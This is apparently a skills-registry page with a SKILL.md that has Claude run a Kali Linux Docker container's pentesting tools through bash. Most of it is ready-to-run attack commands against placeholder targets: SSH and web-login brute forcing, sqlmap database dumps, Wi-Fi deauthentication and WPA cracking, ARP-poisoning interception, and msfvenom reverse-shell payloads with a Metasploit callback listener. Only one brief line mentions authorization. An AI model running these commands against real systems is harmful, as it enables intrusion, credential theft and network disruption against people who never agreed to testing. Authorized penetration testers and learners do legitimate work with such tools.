---
rating: ⭐⭐⭐
title: kali
url: https://skills.sh/cyb3rdudu/dotfiles/kali
---

# kali

skills/cyb3rdudu/dotfiles/kali
kali
Installation
$ npx skills add https://github.com/cyb3rdudu/dotfiles --skill kali
SKILL.md
Kali Docker Pentesting Skill
Overview

This skill provides intelligent access to a comprehensive Kali Linux Docker container with 200+ pentesting tools. Instead of using an MCP server, this skill enables direct command execution via bash_tool, making it 70% more token-efficient.

📁 DATA PERSISTENCE & OUTPUT LOGGING (CRITICAL)
Volume Mount Structure

The container has two persistent volumes that sync with the host:

HOST                          CONTAINER
./shared/           <--->     /home/kaliuser/shared/
./wordlists/        <--->     /home/kaliuser/wordlists/

MANDATORY OUTPUT RULE

⚠️ CRITICAL: ALL scan results, outputs, and findings MUST be saved to /home/kaliuser/shared/

This ensures:

✅ Data persists after container restart
✅ Results are immediately available on host in ./shared/
✅ Complete audit trail for all activities
✅ Easy access for reporting and analysis
Output Organization Best Practices
1. Use Timestamps in Filenames
# Generate timestamp
TIMESTAMP=$(date +%Y%m%d_%H%M%S)

# Save with timestamp
docker exec kali nmap -sV 192.168.1.1 -oA /home/kaliuser/shared/nmap_scan_$TIMESTAMP

2. Organize by Tool/Category
# Create organized directory structure
docker exec kali mkdir -p /home/kaliuser/shared/{nmap,gobuster,nikto,sqlmap,hydra,john,metasploit,wireless,forensics}

# Save to organized locations
docker exec kali nmap -sV target.com -oA /home/kaliuser/shared/nmap/scan_$(date +%Y%m%d_%H%M%S)
docker exec kali gobuster dir -u http://target.com -w /wordlist -o /home/kaliuser/shared/gobuster/target_$(date +%Y%m%d_%H%M%S).txt

3. Standard Naming Convention
FORMAT: {tool}_{target}_{type}_{timestamp}.{ext}

EXAMPLES:
- nmap_192.168.1.1_full_20260125_143022.xml
- gobuster_example.com_dirs_20260125_143022.txt
- nikto_target.com_vuln_20260125_143022.txt
- hydra_ssh_192.168.1.10_20260125_143022.txt
- john_hashes_cracked_20260125_143022.txt

Built-in Wordlists vs Custom Wordlists
Built-in Wordlists (Use Directly - No Mount Needed)
# Pre-installed wordlists in container:
/usr/share/wordlists/rockyou.txt          # Most popular passwords (needs extraction)
/usr/share/wordlists/dirb/common.txt      # Common directories
/usr/share/seclists/                      # Full SecLists collection
/usr/share/wordlists/metasploit/          # Metasploit wordlists

# Extract rockyou (one-time operation)
docker exec kali gunzip /usr/share/wordlists/rockyou.txt.gz

# Use built-in wordlists
docker exec kali hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target

Custom Wordlists (Save to Volume)
# Generate custom wordlist and save to mounted volume
docker exec kali crunch 6 8 -o /home/kaliuser/wordlists/custom_6-8.txt
docker exec kali cewl http://target.com -w /home/kaliuser/wordlists/target_words.txt

# Custom wordlists appear in ./wordlists/ on host

Complete Logging Examples
Network Scanning
# Create directory structure
docker exec kali mkdir -p /home/kaliuser/shared/recon/$(date +%Y%m%d)

# Host discovery with logging
docker exec kali bash -c 'nmap -sn 192.168.1.0/24 -oA /home/kaliuser/shared/recon/$(date +%Y%m%d)/host_discovery_$(date +%H%M%S)'

# Port scan with logging
docker exec kali bash -c 'nmap -sV -p- 192.168.1.100 -oA /home/kaliuser/shared/recon/$(date +%Y%m%d)/port_scan_192.168.1.100_$(date +%H%M%S)'

Web Application Testing
# Create web assessment directory
docker exec kali mkdir -p /home/kaliuser/shared/web/target.com

# Directory enumeration
docker exec kali gobuster dir -u http://target.com \
  -w /usr/share/wordlists/dirb/common.txt \
  -o /home/kaliuser/shared/web/target.com/gobuster_$(date +%Y%m%d_%H%M%S).txt

# Nikto scan
docker exec kali nikto -h http://target.com \
  -o /home/kaliuser/shared/web/target.com/nikto_$(date +%Y%m%d_%H%M%S).txt

# SQL injection testing
docker exec kali sqlmap -u "http://target.com/page?id=1" --batch \
  --output-dir=/home/kaliuser/shared/web/target.com/sqlmap_$(date +%Y%m%d_%H%M%S)

Password Cracking
# Create password cracking directory
docker exec kali mkdir -p /home/kaliuser/shared/passwords

# John the Ripper with logging
docker exec kali john /home/kaliuser/shared/passwords/hashes.txt \
  --wordlist=/usr/share/wordlists/rockyou.txt \
  > /home/kaliuser/shared/passwords/john_output_$(date +%Y%m%d_%H%M%S).txt

# Hydra brute force with logging
docker exec kali hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  ssh://192.168.1.10 \
  -o /home/kaliuser/shared/passwords/hydra_ssh_$(date +%Y%m%d_%H%M%S).txt

Wireless Attacks
# Create wireless directory
docker exec kali mkdir -p /home/kaliuser/shared/wireless

# Capture handshake
docker exec kali airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF \
  -w /home/kaliuser/shared/wireless/capture_$(date +%Y%m%d_%H%M%S) wlan0mon

# Crack WPA
docker exec kali aircrack-ng -w /usr/share/wordlists/rockyou.txt \
  /home/kaliuser/shared/wireless/capture_*.cap \
  | tee /home/kaliuser/shared/wireless/crack_result_$(date +%Y%m%d_%H%M%S).txt

Exploitation & Payloads
# Create payloads directory
docker exec kali mkdir -p /home/kaliuser/shared/payloads

# Generate payload and save to shared volume
docker exec kali msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 -f exe \
  -o /home/kaliuser/shared/payloads/payload_$(date +%Y%m%d_%H%M%S).exe

# Metasploit resource file logging
docker exec kali bash -c 'echo "spool /home/kaliuser/shared/payloads/msf_session_$(date +%Y%m%d_%H%M%S).log" > /tmp/msf.rc'

Accessing Results on Host
# View all saved results
ls -lh ./shared/

# View organized by date
tree ./shared/

# Search for specific scan
find ./shared/ -name "*nmap*" -type f

# Archive results
tar -czf pentest_results_$(date +%Y%m%d).tar.gz ./shared/

Quick Reference: Output Flags by Tool
# Nmap
-oN file.txt        # Normal output
-oX file.xml        # XML output
-oA basename        # All formats (recommended)

# Gobuster
-o file.txt         # Output to file

# Nikto
-o file.txt         # Output to file

# SQLmap
--output-dir=path   # Output directory

# Hydra
-o file.txt         # Output to file

# John
> file.txt          # Redirect stdout

# Aircrack-ng
-w /path/to/file    # Output file (for airodump-ng)

# Metasploit
spool file.log      # Log session to file

Container Management
Starting the Container

The container is managed via docker-compose with automatic volume mounting:

# Start with VPN (recommended for anonymized testing)
docker-compose up -d

# Start without VPN (direct connection)
docker-compose up -d kali

# Build from scratch
docker-compose build

# Check status
docker-compose ps


Volume mounts are automatic:

./shared/ → /home/kaliuser/shared/ (all scan results & outputs)
./wordlists/ → /home/kaliuser/wordlists/ (custom wordlists only)
Running Commands
# Execute single command
docker exec kali [tool] [options]

# Interactive shell
docker exec -it kali /bin/bash

# Copy files out
docker cp kali:/home/kaliuser/shared/scan.txt ./output/

# Copy files in
docker cp ./wordlist.txt kali:/home/kaliuser/shared/

Container Lifecycle
# Stop container
docker stop kali

# Start existing container
docker start kali

# Remove container
docker rm kali

# View logs
docker logs kali

Tool Catalog
🔍 Network Discovery & Scanning
nmap - Network Mapper

Description: Industry-standard network scanner for host discovery, port scanning, and service detection.

Usage:

# Basic scan
docker exec kali nmap 192.168.1.1

# Service version detection
docker exec kali nmap -sV 192.168.1.1

# OS detection
docker exec kali nmap -O 192.168.1.1

# Comprehensive scan
docker exec kali nmap -sC -sV -O -p- 192.168.1.1

# Save results (ALWAYS use /home/kaliuser/shared/)
docker exec kali bash -c 'nmap -sV -oA /home/kaliuser/shared/nmap_scan_$(date +%Y%m%d_%H%M%S) 192.168.1.0/24'


Common Options:

-sS - SYN stealth scan
-sT - TCP connect scan
-sU - UDP scan
-sV - Version detection
-O - OS detection
-A - Aggressive scan (OS, version, scripts, traceroute)
-p- - Scan all 65535 ports
-Pn - Skip ping (assume host is up)
-T4 - Faster timing (0-5)
-oA - Output all formats
masscan - Fast Port Scanner

Description: Extremely fast port scanner, can scan the entire internet in under 6 minutes.

Usage:

# Scan specific ports
docker exec kali masscan 192.168.1.0/24 -p80,443,8080

# Scan all ports fast
docker exec kali masscan 192.168.1.0/24 -p0-65535 --rate=10000

# Save results
docker exec kali masscan 10.0.0.0/8 -p80 -oL /home/kaliuser/shared/masscan.txt

netdiscover - Network Discovery

Description: Active/passive ARP reconnaissance tool.

Usage:

# Passive mode
docker exec kali netdiscover -p -i eth0

# Active mode with range
docker exec kali netdiscover -r 192.168.1.0/24

arp-scan - ARP Scanner

Description: Discovers IPv4 hosts using ARP.

Usage:

docker exec kali arp-scan --localnet
docker exec kali arp-scan 192.168.1.0/24

🌐 Web Application Testing
nikto - Web Server Scanner

Description: Web server vulnerability scanner.

Usage:

# Basic scan
docker exec kali nikto -h http://target.com

# SSL scan
docker exec kali nikto -h https://target.com -ssl

# Save results
docker exec kali nikto -h http://target.com -o /home/kaliuser/shared/nikto.txt

# Tuning options
docker exec kali nikto -h http://target.com -Tuning 123bde

dirb - Directory Brute Forcer

Description: Web content scanner.

Usage:

# Default wordlist
docker exec kali dirb http://target.com

# Custom wordlist
docker exec kali dirb http://target.com /usr/share/wordlists/dirb/common.txt

# Save results
docker exec kali dirb http://target.com -o /home/kaliuser/shared/dirb.txt

# Extensions
docker exec kali dirb http://target.com -X .php,.html,.txt

gobuster - Directory/DNS Enumeration

Description: Fast directory and DNS enumeration tool.

Usage:

# Directory enumeration
docker exec kali gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# DNS subdomain enumeration
docker exec kali gobuster dns -d target.com -w /usr/share/wordlists/subdomains.txt

# Virtual host discovery
docker exec kali gobuster vhost -u http://target.com -w /usr/share/wordlists/vhosts.txt

wfuzz - Web Fuzzer

Description: Web application fuzzer.

Usage:

# Directory fuzzing
docker exec kali wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --hc 404 http://target.com/FUZZ

# Parameter fuzzing
docker exec kali wfuzz -c -z file,/usr/share/wordlists/passwords.txt http://target.com/page?id=FUZZ

# POST data fuzzing
docker exec kali wfuzz -c -z file,users.txt -z file,pass.txt -d "user=FUZZ&pass=FUZ2Z" http://target.com/login

sqlmap - SQL Injection Tool

Description: Automatic SQL injection and database takeover tool.

Usage:

# Basic test
docker exec kali sqlmap -u "http://target.com/page?id=1"

# POST request
docker exec kali sqlmap -u "http://target.com/login" --data="user=admin&pass=test"

# Enumerate databases
docker exec kali sqlmap -u "http://target.com/page?id=1" --dbs

# Dump database
docker exec kali sqlmap -u "http://target.com/page?id=1" -D dbname --dump

# Full automation
docker exec kali sqlmap -u "http://target.com/page?id=1" --batch --dump-all

wpscan - WordPress Scanner

Description: WordPress vulnerability scanner.

Usage:

# Basic scan
docker exec kali wpscan --url http://target.com

# Enumerate users
docker exec kali wpscan --url http://target.com --enumerate u

# Enumerate plugins
docker exec kali wpscan --url http://target.com --enumerate p

# Aggressive scan
docker exec kali wpscan --url http://target.com --enumerate ap,at,cb,dbe

whatweb - Website Fingerprinting

Description: Identifies websites and web technologies.

Usage:

# Basic scan
docker exec kali whatweb http://target.com

# Aggressive mode
docker exec kali whatweb -a 3 http://target.com

# Scan multiple URLs
docker exec kali whatweb -i /home/kaliuser/shared/urls.txt

🔐 Password Attacks
john - John the Ripper

Description: Fast password cracker.

Usage:

# Crack with default wordlist
docker exec kali john /home/kaliuser/shared/hashes.txt

# Use rockyou wordlist
docker exec kali john --wordlist=/usr/share/wordlists/rockyou.txt /home/kaliuser/shared/hashes.txt

# Crack specific format
docker exec kali john --format=raw-md5 /home/kaliuser/shared/hashes.txt

# Show cracked passwords
docker exec kali john --show /home/kaliuser/shared/hashes.txt

# Incremental mode
docker exec kali john --incremental /home/kaliuser/shared/hashes.txt

hashcat - Advanced Password Recovery

Description: World's fastest password cracker.

Usage:

# MD5 crack
docker exec kali hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

# SHA256 crack
docker exec kali hashcat -m 1400 -a 0 hashes.txt wordlist.txt

# Brute force
docker exec kali hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a

# Show results
docker exec kali hashcat -m 0 hashes.txt --show


Hash Modes:

0 = MD5
100 = SHA1
1400 = SHA256
1700 = SHA512
1000 = NTLM
3200 = bcrypt
hydra - Network Password Cracker

Description: Fast network logon cracker.

Usage:

# SSH brute force
docker exec kali hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1

# HTTP POST form
docker exec kali hydra -l admin -P passwords.txt 192.168.1.1 http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"

# FTP brute force
docker exec kali hydra -L users.txt -P passwords.txt ftp://192.168.1.1

# Multiple protocols
docker exec kali hydra -L users.txt -P passwords.txt 192.168.1.1 ssh ftp http

medusa - Parallel Password Cracker

Description: Speedy, parallel, modular login brute-forcer.

Usage:

# SSH attack
docker exec kali medusa -h 192.168.1.1 -u admin -P passwords.txt -M ssh

# HTTP basic auth
docker exec kali medusa -h 192.168.1.1 -u admin -P passwords.txt -M http

crunch - Wordlist Generator

Description: Generates custom wordlists.

Usage:

# Generate 6-8 character wordlist
docker exec kali crunch 6 8 -o /home/kaliuser/shared/wordlist.txt

# Custom charset
docker exec kali crunch 4 6 0123456789 -o /home/kaliuser/shared/numbers.txt

# Pattern-based
docker exec kali crunch 8 8 -t pass@@@@ -o /home/kaliuser/shared/pattern.txt

📡 Wireless Security
aircrack-ng - WiFi Security Suite

Description: Complete suite for assessing WiFi network security.

Usage:

# Start monitor mode
docker exec kali airmon-ng start wlan0

# Capture packets
docker exec kali airodump-ng wlan0mon

# Capture specific network
docker exec kali airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w /home/kaliuser/shared/capture wlan0mon

# Deauth attack
docker exec kali aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# Crack WPA handshake
docker exec kali aircrack-ng -w /usr/share/wordlists/rockyou.txt /home/kaliuser/shared/capture-01.cap

wifite - Automated Wireless Attack

Description: Automated wireless attack tool.

Usage:

# Automatic WPA attack
docker exec kali wifite --wpa

# All attack types
docker exec kali wifite

# Specific target
docker exec kali wifite -i wlan0 --kill

reaver - WPS Attack

Description: Brute force WPS PINs.

Usage:

docker exec kali reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv

🕵️ Information Gathering
theharvester - Email/Subdomain Harvester

Description: Gather emails, subdomains, IPs from public sources.

Usage:

# Search all sources
docker exec kali theharvester -d target.com -b all

# Specific source
docker exec kali theharvester -d target.com -b google

# Save results
docker exec kali theharvester -d target.com -b all -f /home/kaliuser/shared/harvest

dnsrecon - DNS Enumeration

Description: DNS enumeration and network reconnaissance.

Usage:

# Standard enumeration
docker exec kali dnsrecon -d target.com

# Zone transfer
docker exec kali dnsrecon -d target.com -a

# Brute force subdomains
docker exec kali dnsrecon -d target.com -D /usr/share/wordlists/subdomains.txt -t brt

sublist3r - Subdomain Enumeration

Description: Fast subdomain enumeration using OSINT.

Usage:

# Basic enumeration
docker exec kali sublist3r -d target.com

# Enable brute force
docker exec kali sublist3r -d target.com -b

# Save results
docker exec kali sublist3r -d target.com -o /home/kaliuser/shared/subdomains.txt

enum4linux - SMB Enumeration

Description: Tool for enumerating information from Windows and Samba systems.

Usage:

# Full enumeration
docker exec kali enum4linux -a 192.168.1.1

# User enumeration
docker exec kali enum4linux -U 192.168.1.1

# Share enumeration
docker exec kali enum4linux -S 192.168.1.1

dmitry - Deep Information Gathering

Description: Deepmagic Information Gathering Tool.

Usage:

# Full scan
docker exec kali dmitry -winsepo /home/kaliuser/shared/dmitry.txt target.com

# Subdomain search
docker exec kali dmitry -s target.com

🛡️ Exploitation Frameworks
metasploit-framework - Penetration Testing Framework

Description: The world's most used penetration testing framework.

Usage:

# Start msfconsole
docker exec -it kali msfconsole

# Generate payload
docker exec kali msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > /home/kaliuser/shared/payload.exe

# Search exploits
docker exec -it kali bash -c "echo 'search tomcat' | msfconsole -q"

# Run resource script
docker exec kali msfconsole -r /home/kaliuser/shared/script.rc


Common msfvenom payloads:

# Windows reverse shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o shell.exe

# Linux reverse shell
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf -o shell.elf

# PHP reverse shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f raw -o shell.php

# Android APK
msfvenom -p android/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -o shell.apk

social-engineer-toolkit (SET)

Description: Social engineering penetration testing framework.

Usage:

# Start SET
docker exec -it kali setoolkit

🔬 Forensics & Analysis
binwalk - Firmware Analysis

Description: Analyze and extract firmware images.

Usage:

# Scan for embedded files
docker exec kali binwalk /home/kaliuser/shared/firmware.bin

# Extract files
docker exec kali binwalk -e /home/kaliuser/shared/firmware.bin

# Signature scan
docker exec kali binwalk --signature /home/kaliuser/shared/file.bin

foremost - File Carving

Description: Recover files based on headers and footers.

Usage:

# Recover all file types
docker exec kali foremost -i /home/kaliuser/shared/image.dd -o /home/kaliuser/shared/recovered

# Specific file types
docker exec kali foremost -t jpg,png,pdf -i /home/kaliuser/shared/image.dd -o /home/kaliuser/shared/

volatility - Memory Forensics

Description: Advanced memory forensics framework.

Usage:

# Get image info
docker exec kali volatility -f /home/kaliuser/shared/memory.dump imageinfo

# List processes
docker exec kali volatility -f /home/kaliuser/shared/memory.dump --profile=Win7SP1x64 pslist

# Dump process
docker exec kali volatility -f /home/kaliuser/shared/memory.dump --profile=Win7SP1x64 procdump -p 1234 -D /home/kaliuser/shared/

strings - Extract Strings

Description: Extract printable strings from files.

Usage:

# Basic extraction
docker exec kali strings /home/kaliuser/shared/binary > /home/kaliuser/shared/strings.txt

# Minimum length 10
docker exec kali strings -n 10 /home/kaliuser/shared/binary

# Unicode strings
docker exec kali strings -e l /home/kaliuser/shared/binary

exiftool - Metadata Extraction

Description: Read and write meta information in files.

Usage:

# View metadata
docker exec kali exiftool /home/kaliuser/shared/image.jpg

# Remove all metadata
docker exec kali exiftool -all= /home/kaliuser/shared/image.jpg

# Batch process
docker exec kali exiftool /home/kaliuser/shared/*.jpg

🔄 Reverse Engineering
ghidra - Software Reverse Engineering

Description: NSA's software reverse engineering framework.

Usage:

# GUI mode (requires X11 forwarding)
docker exec -it kali ghidra

# Headless mode
docker exec kali analyzeHeadless /workspace /project -import /home/kaliuser/shared/binary.exe

radare2 - Reverse Engineering Framework

Description: Advanced reverse engineering framework.

Usage:

# Open binary
docker exec -it kali r2 /home/kaliuser/shared/binary

# Analyze
docker exec -it kali bash -c "echo 'aaa; pdf' | r2 /home/kaliuser/shared/binary"

# Disassemble
docker exec kali r2 -c 'pd 10' /home/kaliuser/shared/binary

gdb - GNU Debugger

Description: Standard debugger for Unix systems.

Usage:

# Debug binary
docker exec -it kali gdb /home/kaliuser/shared/binary

# With PEDA
docker exec -it kali gdb -q /home/kaliuser/shared/binary

🎯 Vulnerability Assessment
lynis - Security Auditing

Description: Security auditing tool for Unix/Linux systems.

Usage:

# Full audit
docker exec kali lynis audit system

# Quick scan
docker exec kali lynis audit system --quick

nikto - Web Vulnerability Scanner

(See Web Application Testing section)

openvas - Vulnerability Scanner

Description: Full-featured vulnerability scanner.

Usage:

# Start OpenVAS (requires initialization)
docker exec kali openvas-start

📊 Network Analysis
tcpdump - Packet Capture

Description: Command-line packet analyzer.

Usage:

# Capture on interface
docker exec kali tcpdump -i eth0

# Capture to file
docker exec kali tcpdump -i eth0 -w /home/kaliuser/shared/capture.pcap

# Read file
docker exec kali tcpdump -r /home/kaliuser/shared/capture.pcap

# Filter HTTP
docker exec kali tcpdump -i eth0 'tcp port 80'

tshark - Network Protocol Analyzer

Description: Terminal-based Wireshark.

Usage:

# Capture packets
docker exec kali tshark -i eth0

# Capture to file
docker exec kali tshark -i eth0 -w /home/kaliuser/shared/capture.pcap

# Filter display
docker exec kali tshark -r /home/kaliuser/shared/capture.pcap -Y 'http.request'

ettercap - Network Sniffer/Interceptor

Description: Comprehensive suite for MITM attacks.

Usage:

# Text mode
docker exec -it kali ettercap -T -i eth0

# ARP poisoning
docker exec kali ettercap -T -M arp:remote /192.168.1.1// /192.168.1.100//

Common Pentesting Workflows
1. Network Reconnaissance
# Step 1: Discover live hosts
docker exec kali nmap -sn 192.168.1.0/24 -oA /home/kaliuser/shared/hosts

# Step 2: Port scan discovered hosts
docker exec kali nmap -sV -p- -iL /home/kaliuser/shared/hosts.txt -oA /home/kaliuser/shared/ports

# Step 3: Enumerate services
docker exec kali nmap -sC -sV -p 80,443,22,21 192.168.1.0/24 -oA /home/kaliuser/shared/services

2. Web Application Assessment
# Step 1: Identify web technologies
docker exec kali whatweb http://target.com

# Step 2: Directory enumeration
docker exec kali gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -o /home/kaliuser/shared/dirs.txt

# Step 3: Vulnerability scan
docker exec kali nikto -h http://target.com -o /home/kaliuser/shared/nikto.txt

# Step 4: Test for SQLi
docker exec kali sqlmap -u "http://target.com/page?id=1" --batch

3. Password Cracking Workflow
# Step 1: Generate wordlist
docker exec kali crunch 8 12 -t Pass@@@@ -o /home/kaliuser/shared/wordlist.txt

# Step 2: Crack hashes
docker exec kali john --wordlist=/home/kaliuser/shared/wordlist.txt /home/kaliuser/shared/hashes.txt

# Step 3: Network service brute force
docker exec kali hydra -L /home/kaliuser/shared/users.txt -P /home/kaliuser/shared/wordlist.txt ssh://192.168.1.1

4. Wireless Network Assessment
# Step 1: Enable monitor mode
docker exec kali airmon-ng start wlan0

# Step 2: Scan networks
docker exec kali airodump-ng wlan0mon

# Step 3: Capture handshake
docker exec kali airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w /home/kaliuser/shared/capture wlan0mon

# Step 4: Deauth clients
docker exec kali aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon

# Step 5: Crack WPA
docker exec kali aircrack-ng -w /usr/share/wordlists/rockyou.txt /home/kaliuser/shared/capture-01.cap

5. Exploitation Workflow
# Step 1: Search for exploit
docker exec kali searchsploit apache 2.4.49

# Step 2: Generate payload
docker exec kali msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o /home/kaliuser/shared/payload.exe

# Step 3: Setup listener in Metasploit
docker exec -it kali msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.100; set LPORT 4444; exploit"

File Management
Copying Files Between Host and Container

Note: Files in mounted volumes are automatically synced - no need to use docker cp!

# Files are automatically available on both sides:
# Save in container → Appears in ./shared/ on host immediately
docker exec kali nmap -sV target -oA /home/kaliuser/shared/scan

# Access on host
cat ./shared/scan.nmap

# Add files from host → Available in container immediately
echo "target1.com" > ./shared/targets.txt
docker exec kali cat /home/kaliuser/shared/targets.txt

# Only use docker cp for non-mounted paths
docker cp kali:/tmp/some-file.txt ./
docker cp ./local-file.txt kali:/tmp/

Working with Wordlists

Common Wordlist Locations:

/usr/share/wordlists/rockyou.txt - Most popular password list
/usr/share/wordlists/dirb/common.txt - Common directories
/usr/share/seclists/ - SecLists collection
/usr/share/wordlists/metasploit/ - Metasploit wordlists
# List available wordlists
docker exec kali find /usr/share/wordlists -type f

# Extract rockyou (if gzipped)
docker exec kali gunzip /usr/share/wordlists/rockyou.txt.gz

Troubleshooting
Container Won't Start
# Check logs
docker logs kali

# Remove and recreate
docker rm kali
docker run -d --name kali kali-comprehensive

Network Issues
# Use host network
docker run -d --name kali --network host kali-comprehensive

# Add network capabilities
docker run -d --name kali --cap-add=NET_RAW --cap-add=NET_ADMIN kali-comprehensive

Permission Issues
# Run as root (already default)
docker exec -u root kali [command]

# Fix workspace permissions
docker exec kali chmod -R 777 /workspace /results

Metasploit Database Issues
# Initialize database
docker exec kali service postgresql start
docker exec kali msfdb init

# Check status
docker exec kali msfdb status

Best Practices
1. ALWAYS Save Results to /home/kaliuser/shared/

MANDATORY: Every command MUST save output to the shared volume with timestamps:

# ✅ CORRECT - Output saved to shared volume with timestamp
docker exec kali bash -c 'nmap -sV target -oA /home/kaliuser/shared/scan_$(date +%Y%m%d_%H%M%S)'

# ❌ WRONG - Output not saved (lost on container restart)
docker exec kali nmap -sV target

# ✅ CORRECT - Redirect to shared volume
docker exec kali whatweb target.com | tee /home/kaliuser/shared/whatweb_$(date +%Y%m%d_%H%M%S).txt

# Standard output flags (always use /home/kaliuser/shared/)
-o /home/kaliuser/shared/file_$(date +%Y%m%d_%H%M%S).txt     # Generic output
-oA /home/kaliuser/shared/scan_$(date +%Y%m%d_%H%M%S)        # Nmap: all formats
-w /home/kaliuser/shared/capture_$(date +%Y%m%d_%H%M%S).pcap # Capture files

2. Organize by Tool and Date

Create organized directories for better result management:

# Create directory structure
docker exec kali mkdir -p /home/kaliuser/shared/{nmap,web,passwords,wireless,exploitation}/$(date +%Y%m%d)

# Save to organized locations
docker exec kali bash -c 'nmap -sV target -oA /home/kaliuser/shared/nmap/$(date +%Y%m%d)/scan_$(date +%H%M%S)'


Mounted volumes:

./shared/ ↔ /home/kaliuser/shared/ - ALL scan results and outputs (MANDATORY)
./wordlists/ ↔ /home/kaliuser/wordlists/ - Custom wordlists only
Built-in wordlists: /usr/share/wordlists/ (rockyou, seclists, dirb, etc.)
3. Scope Your Testing

Always:

Get written authorization
Define scope boundaries
Document everything
Report findings responsibly
4. Clean Up After Testing
# Stop monitor mode
docker exec kali airmon-ng stop wlan0mon

# Clear temporary files
docker exec kali rm -rf /tmp/*

# Archive results
docker exec kali tar -czf /home/kaliuser/shared/assessment-$(date +%Y%m%d).tar.gz /home/kaliuser/shared/*.txt

Quick Reference
Port Scanning
docker exec kali nmap -sV -p- target

Directory Enumeration
docker exec kali gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt

SQL Injection
docker exec kali sqlmap -u "http://target/page?id=1" --batch

Password Cracking
docker exec kali john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

Network Brute Force
docker exec kali hydra -l admin -P passwords.txt ssh://target

WiFi Cracking
docker exec kali aircrack-ng -w /usr/share/wordlists/rockyou.txt capture.cap

When to Use This Skill

Use this skill when:

Conducting authorized penetration testing
Performing security assessments
Testing network security
Analyzing web applications
Cracking passwords (authorized)
Wireless security auditing
Forensics analysis
Reverse engineering
Learning security techniques

Claude will read this skill and execute commands via bash_tool, providing efficient, direct access to all pentesting tools without MCP protocol overhead.

Weekly Installs
9
Repository
cyb3rdudu/dotfiles
First Seen
Feb 16, 2026
Security Audits
Gen Agent Trust HubPass
SocketFail
SnykFail